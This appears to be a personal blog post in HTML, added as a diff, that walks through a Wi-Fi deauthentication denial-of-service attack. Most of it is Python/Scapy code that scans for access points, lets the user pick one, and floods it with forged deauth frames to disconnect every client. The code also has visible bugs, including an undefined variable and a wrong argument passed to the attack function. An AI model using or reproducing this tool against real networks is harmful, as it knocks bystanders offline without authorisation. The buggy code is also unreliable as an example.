@@ -1,0 +1,158 @@
+<!doctype html><html lang=en-us>
+<head>
+<title>Deauthentication attack against WiFi // Niclas Krause</title>
+<link rel="shortcut icon" href=/favicon.ico>
+<meta charset=utf-8>
+<meta name=generator content="Hugo 0.89.1">
+<meta name=viewport content="width=device-width,initial-scale=1">
+<meta name=author content="Niclas Krause">
+<meta name=description content>
+<link rel=stylesheet href=https://krausen.github.io/css/main.min.4a7ec8660f9a44b08c4da97c5f2e31b1192df1d4d0322e65c0dbbc6ecb1b863f.css>
+<meta name=twitter:card content="summary">
+<meta name=twitter:title content="Deauthentication attack against WiFi">
+<meta name=twitter:description content="A while ago I learned about deauthentication attacks on WiFi access points (AP). Simply put you should be able to perform a DoS attack on a WiFi without having to authenticate to it. The attack is performed by sending a deauth management frame to the AP. I wanted to try it out and learn how and if it actually works. I found that it did and here is my implementation in Python.">
+<meta property="og:title" content="Deauthentication attack against WiFi">
+<meta property="og:description" content="A while ago I learned about deauthentication attacks on WiFi access points (AP). Simply put you should be able to perform a DoS attack on a WiFi without having to authenticate to it. The attack is performed by sending a deauth management frame to the AP. I wanted to try it out and learn how and if it actually works. I found that it did and here is my implementation in Python.">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://krausen.github.io/posts/deauth_wifi/"><meta property="article:section" content="posts">
+<meta property="article:published_time" content="2021-11-07T15:18:06+01:00">
+<meta property="article:modified_time" content="2021-11-07T15:18:06+01:00">
+</head>
+<body>
+<header class=app-header>
+<a href=https://krausen.github.io><img class=app-header-avatar src=/images/niclas.jpeg alt="Niclas Krause"></a>
+<h1>Niclas Krause</h1>
+<nav class=app-header-menu>
+<a class=app-header-menu-item href=/about>About</a>
+-
+<a class=app-header-menu-item href=/>Home</a>
+</nav>
+<p>Software developer based in Stockholm, Sweden</p>
+<div class=app-header-social>
+<a href=https://github.com/krausen target=_blank rel="noreferrer noopener"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-github"><title>My Github</title><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37.0 00-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44.0 0020 4.77 5.07 5.07.0 0019.91 1S18.73.65 16 2.48a13.38 13.38.0 00-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07.0 005 4.77 5.44 5.44.0 003.5 8.55c0 5.42 3.3 6.61 6.44 7A3.37 3.37.0 009 18.13V22"/></svg>
+</a>
+</div>
+</header>
+<main class=app-container>
+<article class=post>
+<header class=post-header>
+<h1 class=post-title>Deauthentication attack against WiFi</h1>
+<div class=post-meta>
+<div><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-calendar"><title>calendar</title><rect x="3" y="4" width="18" height="18" rx="2" ry="2"/><line x1="16" y1="2" x2="16" y2="6"/><line x1="8" y1="2" x2="8" y2="6"/><line x1="3" y1="10" x2="21" y2="10"/></svg>
+Nov 7, 2021
+</div>
+<div><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-clock"><title>clock</title><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>
+4 min read
+</div>
+</div>
+</header>
+<div class=post-content>
+<p>A while ago I learned about deauthentication attacks on WiFi access points (AP). Simply put you should be able to perform a DoS attack on a WiFi without having to authenticate to it.
+The attack is performed by sending a deauth management frame to the AP. I wanted to try it out and learn how and if it actually works. I found that it did and here is my implementation in Python. I had a great time developing this implementation and testing it out. It worked fine for me but it is possibly not risk free. Be cautious and use it only for educational purposes :)</p>
+<h2 id=laying-the-groundwork>Laying the groundwork</h2>
+<p>To run this from your laptop you will need a wireless network interface that support <a href=https://en.wikipedia.org/wiki/Monitor_mode>monitor mode</a>. Luckily mine did and I can switch to it by running <code>iwconfig &lt;wireless-interface> mode monitor</code>. Similarly I can go back to managed mode with the same command after performing the attack. This is a bit simplified but the following Python code will describe how to go back and fort between managed- and monitor mode. As you can see at the end there is also a function for setting the channel of the network interface, but we will get to that in a bit. The commands might depend on you OS, I ran with Ubuntu 20.04 but there is probably equivalent commands for you.</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#75715e># network_interface.py</span>
+<span style=color:#f92672>from</span> subprocess <span style=color:#f92672>import</span> run
+
+
+<span style=color:#66d9ef>def</span> <span style=color:#a6e22e>monitor_mode</span>(interface: str):
+    run([<span style=color:#e6db74>&#34;systemctl&#34;</span>, <span style=color:#e6db74>&#34;stop&#34;</span>, <span style=color:#e6db74>&#34;NetworkManager&#34;</span>])
+    run([<span style=color:#e6db74>&#34;ifconfig&#34;</span>, interface, <span style=color:#e6db74>&#34;down&#34;</span>])
+    run([<span style=color:#e6db74>&#34;iwconfig&#34;</span>, interface, <span style=color:#e6db74>&#34;mode&#34;</span>, <span style=color:#e6db74>&#34;monitor&#34;</span>])
+    run([<span style=color:#e6db74>&#34;ifconfig&#34;</span>, interface, <span style=color:#e6db74>&#34;up&#34;</span>])
+
+
+<span style=color:#66d9ef>def</span> <span style=color:#a6e22e>managed_mode</span>(interface: str):
+    run([<span style=color:#e6db74>&#34;ifconfig&#34;</span>, interface, <span style=color:#e6db74>&#34;down&#34;</span>])
+    run([<span style=color:#e6db74>&#34;iwconfig&#34;</span>, interface, <span style=color:#e6db74>&#34;mode&#34;</span>, <span style=color:#e6db74>&#34;managed&#34;</span>])
+    run([<span style=color:#e6db74>&#34;ifconfig&#34;</span>, interface, <span style=color:#e6db74>&#34;up&#34;</span>])
+    run([<span style=color:#e6db74>&#34;systemctl&#34;</span>, <span style=color:#e6db74>&#34;start&#34;</span>, <span style=color:#e6db74>&#34;NetworkManager&#34;</span>])
+
+
+<span style=color:#66d9ef>def</span> <span style=color:#a6e22e>hop_channel</span>(interface: str, channel: int):
+    run([<span style=color:#e6db74>&#34;iwconfig&#34;</span>, interface, <span style=color:#e6db74>&#34;channel&#34;</span>, str(channel)])
+</code></pre></div><h2 id=detect-your-target>Detect your target</h2>
+<p>Next we need to detect the details of your target. This is very easy because WiFi AP&rsquo;s emit beacons that shout out it&rsquo;s name and what MAC-address it has. It makes sense because how else would you computer be able to find AP&rsquo;s nearby? To do this in Python we will use Scapy to sniff for the beacons and collect the information necessary from them. Here we need to scan all channels that are relevant, because when we are in monitor mode we can only detect AP&rsquo;s on the current channel.</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#75715e># wifi.py</span>
+<span style=color:#f92672>from</span> time <span style=color:#f92672>import</span> sleep
+<span style=color:#f92672>from</span> typing <span style=color:#f92672>import</span> Sequence
+<span style=color:#f92672>from</span> scapy.all <span style=color:#f92672>import</span> AsyncSniffer, Dot11, Dot11Deauth, RadioTap, sendp
+<span style=color:#f92672>from</span> access_point <span style=color:#f92672>import</span> AccessPoint
+<span style=color:#f92672>from</span> network_interface <span style=color:#f92672>import</span> hop_channel
+
+
+<span style=color:#66d9ef>def</span> <span style=color:#a6e22e>detect_networks</span>(interface: str, channels: Sequence[int]):
+    <span style=color:#e6db74>&#34;&#34;&#34;
+</span><span style=color:#e6db74>    Detect WiFi access points
+</span><span style=color:#e6db74>    &#34;&#34;&#34;</span>
+    print(<span style=color:#e6db74>&#34;Scanning for nearby WiFi networks...&#34;</span>)
+    access_points <span style=color:#f92672>=</span> {}
+    
+    <span style=color:#66d9ef>for</span> channel <span style=color:#f92672>in</span> channels:
+        hop_channel(interface, channel)
+        packets <span style=color:#f92672>=</span> _sniff_wifi_beacons(interface)
+        <span style=color:#66d9ef>for</span> packet <span style=color:#f92672>in</span> packets:
+            access_points[packet<span style=color:#f92672>.</span>addr2] <span style=color:#f92672>=</span> AccessPoint(mac<span style=color:#f92672>=</span>packet<span style=color:#f92672>.</span>addr2, ssid<span style=color:#f92672>=</span>packet<span style=color:#f92672>.</span>info<span style=color:#f92672>.</span>decode(<span style=color:#e6db74>&#39;utf-8&#39;</span>), channel<span style=color:#f92672>=</span>channel)
+    access_points <span style=color:#f92672>=</span> list(acces_points<span style=color:#f92672>.</span>values())
+    access_points<span style=color:#f92672>.</span>sort(key<span style=color:#f92672>=</span><span style=color:#66d9ef>lambda</span> n : n<span style=color:#f92672>.</span>ssid)
+    <span style=color:#66d9ef>return</span> access_points
+
+
+<span style=color:#66d9ef>def</span> <span style=color:#a6e22e>_sniff_wifi_beacons</span>(interface):
+    <span style=color:#e6db74>&#34;&#34;&#34;
+</span><span style=color:#e6db74>    Sniff for 802.11 beacon frames
+</span><span style=color:#e6db74>    &#34;&#34;&#34;</span>
+    sniffer <span style=color:#f92672>=</span> AsyncSniffer(iface<span style=color:#f92672>=</span>interface, filter<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;wlan type mgt subtype beacon&#34;</span>, store<span style=color:#f92672>=</span><span style=color:#66d9ef>True</span>)
+    sniffer<span style=color:#f92672>.</span>start()
+    sleep(<span style=color:#ae81ff>2</span>)
+    sniffer<span style=color:#f92672>.</span>stop()
+    <span style=color:#66d9ef>return</span> sniffer<span style=color:#f92672>.</span>results
+</code></pre></div><p>Whenever we find an AP we will use the small model class AccessPoint and save it for later.</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#75715e># access_point.py</span>
+<span style=color:#f92672>from</span> dataclasses <span style=color:#f92672>import</span> dataclass
+
+
+<span style=color:#a6e22e>@dataclass</span>
+<span style=color:#66d9ef>class</span> <span style=color:#a6e22e>AccessPoint</span>():
+    mac: str
+    ssid: str
+    channel: str
+</code></pre></div><h2 id=attack>Attack</h2>
+<p>We will extend the file <code>wifi.py</code> with the logic of the actual attack. Once we have the MAC-address of the target we will craft Dot11Deauth packet and spam the access point with it. Here we are targeting the broadcast MAC-address which will deny access for all devices until we reach the count of 100000 packets sent.</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>attack</span>(interface: str, access_point: AccessPoint):
+    hop_channel(interface, access_point<span style=color:#f92672>.</span>channel)
+    target_device <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;FF:FF:FF:FF:FF:FF&#34;</span>
+    packet <span style=color:#f92672>=</span> RadioTap()<span style=color:#f92672>/</span>Dot11(type<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>, subtype<span style=color:#f92672>=</span><span style=color:#ae81ff>12</span>, addr1<span style=color:#f92672>=</span>target_device, addr2<span style=color:#f92672>=</span>access_point<span style=color:#f92672>.</span>mac, addr3<span style=color:#f92672>=</span>access_point<span style=color:#f92672>.</span>mac)<span style=color:#f92672>/</span>Dot11Deauth(reason<span style=color:#f92672>=</span><span style=color:#ae81ff>7</span>)
+    sendp(packet, inter<span style=color:#f92672>=</span><span style=color:#ae81ff>0.1</span>, count<span style=color:#f92672>=</span><span style=color:#ae81ff>100000</span>, iface<span style=color:#f92672>=</span>interface, verbose<span style=color:#f92672>=</span><span style=color:#ae81ff>1</span>)
+</code></pre></div><h2 id=tie-it-all-together>Tie it all together</h2>
+<p>Lastly here is the main script that ties it all together. It will initially scan for the available AP&rsquo;s and then prompt you for which one you want to attack.
+The channels are magically hard coded but you can check out what make sense for where you live <a href=https://en.wikipedia.org/wiki/List_of_WLAN_channels>here</a>.</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#f92672>from</span> wifi <span style=color:#f92672>import</span> detect_networks, attack
+<span style=color:#f92672>from</span> network_interface <span style=color:#f92672>import</span> monitor_mode, managed_mode
+
+
+CHANNELS <span style=color:#f92672>=</span> [<span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>2</span>, <span style=color:#ae81ff>3</span>, <span style=color:#ae81ff>4</span>, <span style=color:#ae81ff>5</span>, <span style=color:#ae81ff>6</span>, <span style=color:#ae81ff>7</span>, <span style=color:#ae81ff>8</span>, <span style=color:#ae81ff>9</span>, <span style=color:#ae81ff>10</span>, <span style=color:#ae81ff>11</span>, <span style=color:#ae81ff>12</span>, <span style=color:#ae81ff>13</span>, <span style=color:#ae81ff>36</span>, <span style=color:#ae81ff>40</span>, <span style=color:#ae81ff>44</span>, <span style=color:#ae81ff>48</span>, <span style=color:#ae81ff>52</span>, <span style=color:#ae81ff>56</span>, <span style=color:#ae81ff>60</span>, <span style=color:#ae81ff>64</span>]
+WIFI_INTERFACE <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;wlp4s0&#34;</span>
+
+monitor_mode(WIFI_INTERFACE)
+acces_points <span style=color:#f92672>=</span> detect_networks(WIFI_INTERFACE, CHANNELS)
+
+<span style=color:#66d9ef>for</span> i, ap <span style=color:#f92672>in</span> enumerate(acces_points):
+    print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;</span><span style=color:#e6db74>{</span>i<span style=color:#e6db74>}</span><span style=color:#e6db74>: </span><span style=color:#e6db74>{</span>ap<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
+
+option <span style=color:#f92672>=</span> input(<span style=color:#e6db74>&#34;Select which network to deauthenticate and hit return: &#34;</span>)
+acces_point <span style=color:#f92672>=</span> acces_points[int(option)]
+answer <span style=color:#f92672>=</span> input(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;Are you sure you want to deauthenticate </span><span style=color:#e6db74>{</span>acces_point<span style=color:#f92672>.</span>ssid<span style=color:#e6db74>}</span><span style=color:#e6db74>? Y/n &#34;</span>)
+<span style=color:#66d9ef>if</span> <span style=color:#f92672>not</span> answer <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;Y&#34;</span>:
+    exit(<span style=color:#ae81ff>0</span>)
+
+attack(WIFI_INTERFACE, answer)
+managed_mode(WIFI_INTERFACE)
+</code></pre></div><p>Hope you enjoyed the read and if you want to check out the source code you find on <a href=https://github.com/krausen/wifi-deauthentication>GitHub</a></p>
+</div>
+<div class=post-footer>
+</div>
+</article>
+</main>
+</body>
+</html>
